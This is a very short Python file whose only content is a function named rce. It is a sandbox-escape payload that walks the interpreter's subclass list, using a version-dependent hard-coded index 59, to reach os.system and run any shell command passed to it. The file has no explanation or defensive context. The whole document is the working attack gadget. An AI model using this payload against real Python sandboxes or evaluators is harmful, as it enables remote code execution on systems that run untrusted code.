# -*- coding：utf-8 -*-

def rce(cmd):
    [].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(cmd)